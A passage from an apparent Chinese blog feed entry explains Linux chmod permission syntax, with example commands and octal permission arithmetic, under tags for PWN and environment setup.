文件/目录权限设置命令</p><ol><li>语法：<code>chmod [对谁操作] [操作符] [赋予的权限] 文件名</code></li><li>操作对象：<ol><li>u 用户user,表现文件或目录的所有者</li><li>g 用户组group 表现文件或目录所属的用户组</li><li>o 其他用户other</li><li>a 所有用户all</li></ol></li><li>操作符： <ol><li><code>+</code> 添加权限</li><li><code>-</code> 减少权限</li><li><code>=</code> 直接给定一个权限</li></ol></li><li>权限： <code>r、w、x</code></li></ol><p>实例：（网上找的，感觉以后直接拿来用就好了）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> u+x file 　　　 给file的属主增加执行权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 751 file 　　　 给file的属主分配读、写、执行(7)的权限，给file的所在组分配读、执行(5)的权限，给其他用户分配执行(1)的权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> u=rwx,g=rx,o=x file 上例的另一种形式</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> =r file 　　　　为所有用户分配读权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 444 file 　　　　 同上例</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> a-wx,a+r file 　　 　 同上例</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> -R u+r directory 　 递归地给directory目录下所有文件和子目录的属主分配读的权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 4755 　　设置用ID，给属主分配读、写和执行权限，给组和其他用户分配读、执行的权限。</span><br></code></pre></td></tr></tbody></table></figure><p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。r=4，w=2，x=1</p><blockquote><p>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=5。</p></blockquote><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装Pwntools&quot;&gt;&lt;a href=&quot;#安装Pwntools&quot; class=&quot;headerlink&quot; title=&quot;安装Pwntools&quot;&gt;&lt;/a&gt;安装Pwntools&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;sudo apt-get upda</summary>
      
    
    
    
    
    <category term="搭建环境" scheme="https://sinky.top/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="ida远程" scheme="https://sinky.top/tags/ida%E8%BF%9C%E7%A8%8B/"/>
    
    <category term="linux" scheme="https://sinky.top/tags/linux/"/>
    
  </entry>
  
</feed>
